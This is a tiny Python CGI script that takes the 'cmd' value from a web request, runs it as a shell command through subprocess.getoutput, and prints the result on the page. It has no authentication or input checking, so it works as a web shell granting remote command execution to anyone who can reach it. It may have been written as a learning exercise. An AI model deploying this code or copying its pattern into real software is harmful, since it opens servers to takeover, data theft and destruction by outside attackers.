#!/usr/bin/python3
import cgi
import subprocess
print("content-type: text/html")
print("")
y=cgi.FieldStorage()
cmd=y.getvalue("cmd")
print("Output is             ")
out=subprocess.getoutput(cmd)
print("\n")
print(out)
print("HIII")
